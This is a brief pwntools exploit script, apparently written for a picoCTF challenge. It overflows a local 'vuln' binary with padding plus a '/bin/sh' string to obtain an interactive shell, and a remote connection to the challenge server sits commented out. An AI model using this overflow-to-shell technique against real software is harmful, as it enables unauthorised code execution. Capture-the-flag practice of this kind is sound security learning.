from pwn import *

# pr = remote('saffron-estate.picoctf.net',52024 )
pr = process('./vuln')

padding = b'a' * 10
payload = padding + b'/bin/sh\x00'

input()

pr.sendline(payload)
pr.interactive()